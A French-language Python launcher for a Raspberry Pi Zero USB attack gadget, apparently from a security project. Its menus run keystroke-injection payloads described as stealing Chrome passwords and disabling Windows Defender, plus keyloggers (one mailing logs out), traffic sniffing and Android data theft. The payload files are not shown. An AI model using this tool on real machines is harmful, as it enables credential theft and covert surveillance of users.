#!/usr/bin/env python3
"""
Auteur : Gwendoline Dössegger
Date   : 18.07.2022
Ce programme permet d'exécuter les implémentations des scénarios d'attaques :
- Injection de frappes
- Keylogger
- MITM Ethernet
- MITM USB - attaques sur smartphone

Les attaques sont possibles sur Windows, Linux et Android. Toutefois, la Pi doit être vue
comme gadget : HID, Stockage et Ethernet.

Le programme est lancé sur une Raspberry Pi Zero 2W via la commande
> $ sudo python3 main.py
"""
import os
import signal
import subprocess
import sys

import netifaces as netifaces

path_payloads = "/home/pi/payloads/"

# Générée depuis : https://patorjk.com/software/taag/#p=testall&h=0&v=0&f=Big%20Money-nw&t=Hackable
banner = """
    $$\   $$\                     $$\                 $$\       $$\ 
    $$ |  $$ |                    $$ |                $$ |      $$ | 
    $$ |  $$ | $$$$$$\   $$$$$$$\ $$ |  $$\  $$$$$$\  $$$$$$$\  $$ | $$$$$$\  
    $$$$$$$$ | \____$$\ $$  _____|$$ | $$  | \____$$\ $$  __$$\ $$ |$$  __$$\   
    $$  __$$ | $$$$$$$ |$$ /      $$$$$$  /  $$$$$$$ |$$ |  $$ |$$ |$$$$$$$$ |   
    $$ |  $$ |$$  __$$ |$$ |      $$  _$$<  $$  __$$ |$$ |  $$ |$$ |$$   ____|    
    $$ |  $$ |\$$$$$$$ |\$$$$$$$\ $$ | \$$\ \$$$$$$$ |$$$$$$$  |$$ |\$$$$$$$\    
    \__|  \__| \_______| \_______|\__|  \__| \_______|\_______/ \__| \_______|  
    """

# Structure des actions possibles via l'application
menu = {
    '1': ['Injection de frappes', {
        '1': ['Kubuntu - Désactive network manager & force réseau ethernet', 'payloads/linux-network.dd'],
        '2': ['Kubuntu - Récupère les mots de passe de Chrome', 'payloads/kubuntu-chrome-password.dd'],
        '3': ['Kubuntu - Vérifie l\'injecteur de frappes opérationnel', 'payloads/kubuntu-test.dd'],
        '4': ['Windows - Désactive scan Windows Defender de la Pi', 'payloads/windows-defender.dd'],
        '5': ['Windows - Récupère les mots de passe de Chrome', 'payloads/windows-chrome-password.dd'],
        '6': ['Windows - Vérifie l\'injecteur de frappes opérationnel', 'payloads/windows-test.dd'],
        '7': ['Executer son propre payload', 'payloads/'],
    }],
    '2': ['Keylogger [Windows|Linux]', {
        '1': ['Windows Keylogger sans mail', 'keyloggers/keylogger-windows.dd','enregistré sur la Pi'],
        '2': ['Kubuntu Keylogger sans mail', 'keyloggers/keylogger-linux.dd','enregistré sur la Pi'],
        '3': ['Kubuntu Keylogger avec mail', 'keyloggers/keylogger-linux-smtp.dd','envoyé par mail'],
    }],
    '3': ['MITM Ethernet - Écoute du réseau', {
        '1': ['Tshark - Ecoute l\'interface usb0', ['sudo','tshark', '-i', 'usb0', '-w', '/home/pi/pcap/tshark.pcap']],
        '2': ['Tcpdump - Ecoute de l\'intrface usb0', ['sudo', 'tcpdump', '-i', 'usb0', '-tttt', '-w', 'pcap/tcpdump.pcap']],
        '3': ['Tcpdump - Ecoute de l\'intrface usb0 filtrer port 80', ['sudo', 'tcpdump', '-i', 'usb0', '-tttt', '-w', 'pcap/tcpdump_80.pcap', 'port', '443']],
    }],
    '4': ['MITM USB - Attaque sur un smartphone', {
        '1': ['Injection de frappes', 'payloads/'],
        '2': ['[Samsung Android 9] Récupération de données - Copie d\'une image envoyée par email', 'payloads/android-mail.dd'],
        '3': ['[Indisponible] Scan USB communication']
    }],
}

# Nettoie le terminal et affiche la bannière
def clear_console():
    os.system('clear')
    print(banner)

# Vérifie que le fichier transmis en paramètre existe
# Si oui, retourne True sinon False
def file_exist(path,string_error):
    if not os.path.exists(path):
        clear_console()
        print(string_error)
        return False
    return True

# Injection de frappes sur la machine hôte
def injection(dico):
    clear_console()
    # Vérifie que la Pi est bien un gadget HID
    if file_exist("/dev/hidg0",'Erreur, la Pi n\'est pas un HID (file /dev/hidg0 inaccessible)!\n'):
        while True:
            # Liste les scénarios disponibles via notre outil
            print("Choix de scan possible")
            for i in dico:
                print(f' [{i}] - ' + dico[i][0])
            print(f' [0] - Annuler')

            # Saisie utilisateur
            choice = input(f'\nQuelle option voulez-vous lancer [0..{len(dico)}] ?')

            # Retourne au menu principal
            if choice == '0':
                clear_console()
                return

            # Redemande le choix de scénarios en cas d'inexistant
            elif choice not in dico.keys():
                clear_console()
                print("Action inexistante, veuillez entrer une valeur valide.\n")
                continue

            # Dans le cas où l'utilisateur veut saisir le nom du payload
            elif choice == '7':
                print("Le payload doit être stocké dans le répertoire /home/pi/payloads/")
                choice = input(f'\nQuelle option voulez-vous lancer [ex : payload.dd]? ')
                path_file = 'payloads/' + choice
                if not os.path.exists(path_file):
                    clear_console()
                    print(f'Erreur, le payload n\'existe pas!\n')
                    return

                # Execute le payload
                subprocess.Popen(['sudo','python3','inject.py',path_file], start_new_session=True)
                clear_console()
                print(f'Payload : {choice} exécuté !\n')
                return

            # Execute des payloads deja référencés
            else:
                if file_exist(dico[choice][1],'Erreur, le payload n\'existe pas!\n'):
                    subprocess.Popen(['sudo','python3','inject.py',dico[choice][1]], start_new_session=True)
                    clear_console()
                    print(f'Payload : {dico[choice][0]} exécuté !\n')
                    return

# Permet d'exécuter un Keylogger sur la machine hôte via l'injecteur de frappes
# Compatible avec Windows et Linux.
# Attention, les keyloggers doivent être présents dans le stockage de masse
def keylogger(dico):
    clear_console()
    if file_exist("/dev/hidg0", 'Erreur, la Pi n\'est pas un HID (file /dev/hidg0 inaccessible)!\n'):
        while True:
            # Liste les scénarios disponibles via notre outil
            print("Choix de keylogger possible")
            for i in dico:
                print(f' [{i}] - ' + dico[i][0])
            print(f' [0] - Annuler')

            # Saisie utilisateur
            choice = input(f'\nQuelle action voulez-vous [0..{len(dico)}]?')

            # Retourne au menu principal
            if choice == '0':
                clear_console()
                return

            # Redemande le choix de scénarios en cas d'inexistant
            elif choice not in dico.keys():
                clear_console()
                print("Action inexistante, veuillez entrer une valeur valide.\n")
                continue

            # Execute l'attaque
            else:
                if file_exist(dico[choice][1],'Erreur, le payload n\'existe pas!\n'):
                    subprocess.Popen(['sudo', 'python3', 'inject.py', dico[choice][1]], start_new_session=True)
                    clear_console()
                    print(f'Keylogger : {dico[choice][0]} exécuté ! Les logs sont {dico[choice][2]}. \n')
                    return

# Vérifie que l'interface réseau usb0 existe
def interface_exists(interface):
    interfaces = netifaces.interfaces()
    if 'usb0' in interfaces:
        return True

# Scan le réseau et plus précisément l'interface usb0
def mitm_ethernet(dico):
    clear_console()
    if not interface_exists('usb0'):
        clear_console()
        print(f'Internet interface usb0 doesn\'t exist. \n')
        return

    while True:
        # Liste les scénarios disponibles via notre outil
        print("Choix de scan possible")
        for i in dico:
            print(f' [{i}] - ' + dico[i][0])
        print(f' [0] - Annuler')

        # Saisie utilisateur
        choice = input(f'\nQuelle option voulez-vous lancer [0..{len(dico)}] ? ')

        # Retourne au menu principal
        if choice == '0':
            clear_console()
            return

        # Redemande le choix de scénarios en cas d'inexistant
        elif choice not in dico.keys():
            clear_console()
            print("Action inexistante, veuillez entrer une valeur valide.\n")
            continue

        # Execute le scan
        else:
            # Saisie utilisateur
            run_time = int(input("\nCombien de temps voulez-vous scanner le réseau en secondes? "))

            try:
                p = subprocess.Popen(dico[choice][1], start_new_session=True)
                print("**** En cours de scann ****")
                p.wait(timeout=run_time)
            except subprocess.TimeoutExpired:
                print('Terminating the whole process group...', file=sys.stderr)
                os.killpg(os.getpgid(p.pid), signal.SIGTERM)

            clear_console()
            print(f'Scan {dico[choice][0]} exécuté !\n')
            return

# Injecte du code et récupre des données sur un smartphone
def mitm_usb(dico):
    clear_console()
    if file_exist("/dev/hidg0", 'Erreur, la Pi n\'est pas un HID (file /dev/hidg0 inaccessible)!\n'):
        while True:
            # Liste les scénarios disponibles via notre outil
            print("Choix d'attaque MITM sur USB possible")
            for i in dico:
                print(f' [{i}] - ' + dico[i][0])
            print(f' [0] - Annuler')

            # Saisie utilisateur
            choice = input(f'\nQuelle option voulez-vous lancer ? [0..{len(dico)}]?')

            # Retourne au menu principal
            if choice == '0':
                clear_console()
                return

            # Redemande le choix de scénarios en cas d'inexistant
            elif choice not in dico.keys():
                clear_console()
                print("Action inexistante, veuillez entrer une valeur valide.\n")
                continue

            # Redemande le choix de scénarios en cas d'inexistant
            elif choice == '3':
                clear_console()
                print("Action inexistante pour le moment.\n")
                return

            # Execute l'attaque
            else:
                path = dico[choice][1]
                if choice == '1':
                    print("Le payload doit être stocké dans le répertoire /home/pi/payloads/")
                    choice = input(f'\nQuel payload voulez-vous lancer [ex : payload.dd]? ')
                    path = 'payloads/' + choice

                if not file_exist(path,'Erreur, le payload n\'existe pas!\n'):
                    clear_console()
                    print(f'Erreur, le payload {path} n\'existe pas!\n')
                    return

                subprocess.Popen(['sudo', 'python3', 'inject.py', path], start_new_session=True)
                clear_console()
                print(f'Payload : {path} exécuté !\n')
                return


if __name__ == '__main__':
    print(banner)

    while True:
        # Liste les scénarios disponibles via notre outil
        print("Scénarios d'attaques possibles :")
        for i in menu:
            print(f' [{i}] - ' + menu[i][0])
        print(f' [0] - Quitter')

        # Demande l'action désirée
        choice = input(f'\nQuelle option voulez-vous [0..{len(menu)}] ?')

        # Quitte l'application
        if choice == '0':
            print("Adieu !")
            exit()

        # Redemande le choix de scénarios en cas d'inexistant
        elif choice not in menu.keys():
            clear_console()
            print("Action inexistante, veuillez entrer une valeur valide.\n")
            continue

        elif menu[choice][0] == 'Injection de frappes':
            injection(menu[choice][1])

        elif menu[choice][0] == 'Keylogger [Windows|Linux]':
            keylogger(menu[choice][1])

        elif menu[choice][0] == 'MITM Ethernet - Écoute du réseau':
            mitm_ethernet(menu[choice][1])

        elif menu[choice][0] == 'MITM USB - Attaque sur un smartphone':
            mitm_usb(menu[choice][1])

